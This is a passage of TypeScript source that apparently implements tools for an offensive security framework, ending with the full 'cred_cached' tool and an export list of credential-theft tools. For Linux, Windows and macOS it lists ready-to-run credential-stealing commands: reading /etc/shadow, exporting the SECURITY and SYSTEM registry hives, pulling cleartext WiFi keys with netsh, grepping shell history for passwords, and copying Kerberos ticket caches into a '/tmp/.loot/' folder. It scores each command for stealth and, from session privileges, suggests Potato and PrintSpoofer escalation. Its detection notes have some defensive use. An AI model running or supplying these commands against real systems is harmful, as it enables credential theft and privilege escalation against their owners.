    const filtered = tokenType === "all"
      ? techniques
      : techniques.filter(t => t.token_category === tokenType);

    let sessionContext: Record<string, unknown> | null = null;
    if (session) {
      sessionContext = {
        environment_id: session.id,
        privilege_level: session.state.privilegeLevel,
        se_impersonate_available: session.state.tokenPrivileges?.includes("SeImpersonatePrivilege"),
        se_debug_available: session.state.tokenPrivileges?.includes("SeDebugPrivilege"),
        recommendations: session.state.tokenPrivileges?.includes("SeImpersonatePrivilege")
          ? "SeImpersonatePrivilege is available — Potato attacks and PrintSpoofer are directly applicable."
          : session.state.tokenPrivileges?.includes("SeDebugPrivilege")
            ? "SeDebugPrivilege available — token duplication from running processes is possible."
            : "No token manipulation privileges detected. Privilege escalation may be needed first.",
      };
    }

    return json({
      platform,
      token_type_filter: tokenType,
      total_techniques: filtered.length,
      techniques: filtered,
      kb_entries: kbEntries.slice(0, 10).map(summarizeKbEntry),
      session_context: sessionContext,
    });
  },
};

// ── cred_cached ───────────────────────────────────────────────────────────────

const cred_cached: ToolDef = {
  name: "cred_cached",
  description:
    "Find cached credential access techniques for extracting passwords from caches, history files, and temporary storage",
  schema: {
    environment_id: z
      .string()
      .optional()
      .describe("Environment session ID to contextualize results with parsed environment data"),
    platform: z
      .enum(["linux", "windows", "macos"])
      .describe("Target platform for cached credential techniques"),
  },
  async execute(args: any, ctx: ToolContext): Promise<ToolResult> {
    const platform = args.platform as Platform;
    const session = args.environment_id ? lookupSession(args.environment_id, ctx) : null;

    const kbCredAccess = ctx.knowledgeBase.searchByFunction("credential_access", platform);
    const kbCache = ctx.knowledgeBase.searchByKeyword("cache", platform);
    const kbHistory = ctx.knowledgeBase.searchByKeyword("history", platform);
    const kbEntries = deduplicateByBinary([...kbCredAccess, ...kbCache, ...kbHistory])
      .filter(e => e.platform === platform);

    const techniques: CredentialTechnique[] = [];

    if (platform === "linux") {
      techniques.push(
        {
          technique: "Bash History Credential Extraction",
          description: "Search bash history files for commands containing credentials, passwords, and tokens",
          platform: "linux",
          binary: "grep",
          command: 'grep -hi "password\\|passwd\\|secret\\|token\\|api_key\\|mysql.*-p\\|sshpass" /home/*/.bash_history /root/.bash_history 2>/dev/null',
          target_data: "history",
          stealth_score: 2,
          attck_ids: ["T1552.003"],
          prerequisites: ["Read access to user home directories"],
          detection_notes: "Monitor grep operations on .bash_history files. Auditd file access rules.",
        },
        {
          technique: "SSSD Cached Credentials",
          description: "Extract cached Kerberos/LDAP credentials from SSSD's credential cache files",
          platform: "linux",
          binary: "tdbdump",
          command: "tdbdump /var/lib/sss/db/cache_<DOMAIN>.ldb",
          target_data: "cache",
          stealth_score: 1,
          attck_ids: ["T1003.008"],
          prerequisites: ["Root access, SSSD installed and configured"],
          detection_notes: "Monitor tdbdump usage. File access on /var/lib/sss/db/.",
        },
        {
          technique: "Kerberos Ticket Cache (ccache)",
          description: "Copy Kerberos ticket cache files for pass-the-ticket attacks",
          platform: "linux",
          binary: "cp",
          command: "cp /tmp/krb5cc_* /tmp/.loot/ && klist -c /tmp/krb5cc_*",
          target_data: "cache",
          stealth_score: 2,
          attck_ids: ["T1550.003", "T1552.004"],
          prerequisites: ["Read access to /tmp/ krb5cc files (root or file owner)"],
          detection_notes: "Monitor file copies of krb5cc_ files. Kerberos ticket usage from unusual hosts.",
        },
        {
          technique: "Shadow File Password Hash Extraction",
          description: "Read /etc/shadow to obtain password hashes for offline cracking",
          platform: "linux",
          binary: "cat",
          command: "cat /etc/shadow",
          target_data: "shadow",
          stealth_score: 3,
          attck_ids: ["T1003.008"],
          prerequisites: ["Root access"],
          detection_notes: "Monitor reads of /etc/shadow. Auditd rule on shadow file. Well-known technique.",
        },
      );
    }

    if (platform === "windows") {
      techniques.push(
        {
          technique: "Cached Domain Logon Credentials",
          description: "Extract cached domain logon credentials (MSCACHEv2) that persist locally for offline domain auth",
          platform: "windows",
          binary: "reg.exe",
          command: 'reg save HKLM\\SECURITY C:\\Windows\\Temp\\sec.hiv && reg save HKLM\\SYSTEM C:\\Windows\\Temp\\sys.hiv',
          target_data: "mscache",
          stealth_score: 3,
          attck_ids: ["T1003.005"],
          prerequisites: ["SYSTEM-level access"],
          detection_notes: "Sysmon Event 1 (reg.exe save SECURITY). Registry hive export monitoring.",
        },
        {
          technique: "PowerShell History Credential Extraction",
          description: "Search PowerShell command history files for credentials passed as command arguments",
          platform: "windows",
          binary: "type",
          command: 'type %APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt | findstr /i "password secret credential token apikey"',
          target_data: "history",
          stealth_score: 2,
          attck_ids: ["T1552.003"],
          prerequisites: ["User-level access"],
          detection_notes: "Monitor file reads on PSReadLine history. Low suspicion as native command.",
        },
        {
          technique: "DPAPI Credential Blob Extraction",
          description: "Extract and decrypt DPAPI-protected credential blobs using the user's master key",
          platform: "windows",
          binary: "certutil.exe",
          command: 'dir %APPDATA%\\Microsoft\\Credentials\\ && dir %APPDATA%\\Microsoft\\Protect\\',
          target_data: "dpapi",
          stealth_score: 2,
          attck_ids: ["T1555", "T1003.004"],
          prerequisites: ["User-level access for enumeration, master key for decryption"],
          detection_notes: "Monitor access to Credentials and Protect directories. DPAPI audit events.",
        },
        {
          technique: "WiFi Profile Password Extraction",
          description: "Extract stored WiFi passwords from wireless profiles using native netsh command",
          platform: "windows",
          binary: "netsh.exe",
          command: 'netsh wlan show profiles && for /f "tokens=2 delims=:" %a in (\'netsh wlan show profiles ^| findstr "Profile"\') do netsh wlan show profile name=%a key=clear',
          target_data: "wifi",
          stealth_score: 3,
          attck_ids: ["T1552.002"],
          prerequisites: ["User-level access, wireless profiles configured"],
          detection_notes: "Monitor netsh wlan commands. Low suspicion — commonly used for troubleshooting.",
        },
      );
    }

    if (platform === "macos") {
      techniques.push(
        {
          technique: "Zsh/Bash History Credential Extraction",
          description: "Search shell history files for commands containing credentials and secrets",
          platform: "macos",
          binary: "grep",
          command: 'grep -hi "password\\|secret\\|token\\|api_key" ~/.zsh_history ~/.bash_history 2>/dev/null',
          target_data: "history",
          stealth_score: 2,
          attck_ids: ["T1552.003"],
          prerequisites: ["User-level access"],
          detection_notes: "Monitor grep operations on shell history files.",
        },
        {
          technique: "Kerberos Ticket Cache (macOS)",
          description: "Access Kerberos ticket caches for pass-the-ticket attacks in Active Directory-joined macOS environments",
          platform: "macos",
          binary: "klist",
          command: "klist && cp /tmp/krb5cc_* /tmp/.loot/",
          target_data: "cache",
          stealth_score: 2,
          attck_ids: ["T1550.003"],
          prerequisites: ["User-level access, macOS bound to Active Directory"],
          detection_notes: "Monitor klist usage and Kerberos cache file copies.",
        },
        {
          technique: "Safari Stored Passwords (plist)",
          description: "Access Safari's stored credentials from preference plist files for offline analysis",
          platform: "macos",
          binary: "plutil",
          command: "plutil -p ~/Library/Safari/Bookmarks.plist && plutil -p ~/Library/Cookies/Cookies.binarycookies",
          target_data: "browser",
          stealth_score: 2,
          attck_ids: ["T1555.003"],
          prerequisites: ["User-level access, TCC may restrict full access"],
          detection_notes: "Monitor plutil access to Safari directories. TCC prompts may appear.",
        },
      );
    }

    let sessionContext: Record<string, unknown> | null = null;
    if (session) {
      const historyFiles = session.state.sensitiveFiles.filter(f =>
        f.path.includes("history") || f.path.includes("cache") || f.path.includes("shadow"),
      );

      sessionContext = {
        environment_id: session.id,
        platform: session.state.platform,
        privilege_level: session.state.privilegeLevel,
        history_and_cache_files: historyFiles.map(f => ({ path: f.path, readable: f.readable })),
        recommendations: historyFiles.length > 0
          ? `Found ${historyFiles.length} history/cache file(s) — credential extraction from cached data is possible.`
          : "No known history/cache files detected in environment data. Manual enumeration recommended.",
      };
    }

    return json({
      platform,
      total_techniques: techniques.length,
      techniques,
      kb_entries: kbEntries.slice(0, 10).map(summarizeKbEntry),
      session_context: sessionContext,
    });
  },
};

// ── Export ─────────────────────────────────────────────────────────────────────

export const credentialTools: ToolDef[] = [
  cred_file_harvest,
  cred_memory_dump,
  cred_keychain,
  cred_registry,
  cred_token_theft,
  cred_cached,
];
